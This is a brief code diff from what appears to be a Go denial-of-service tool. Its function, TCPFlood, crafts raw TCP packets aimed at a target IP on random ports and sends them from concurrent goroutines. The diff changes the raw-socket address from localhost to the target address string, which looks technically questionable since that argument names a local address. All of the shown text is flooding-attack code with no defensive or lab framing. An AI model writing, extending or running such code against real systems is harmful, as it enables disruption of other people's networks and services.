@@ -86,7 +86,7 @@ func TCPFlood(destIPStr string, totalPacketToSend int) {
 		go func(tcpPorts []int, destIP net.IP) {
 			// making the packet with a random port from list and dest IP
 			ipHeader, packetBytes := makePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
-			packetConn, err := net.ListenPacket("ip4:tcp", "127.0.0.1")
+			packetConn, err := net.ListenPacket("ip4:tcp", destIPStr)
 			if err != nil {
 				handleErr(err)
 			}
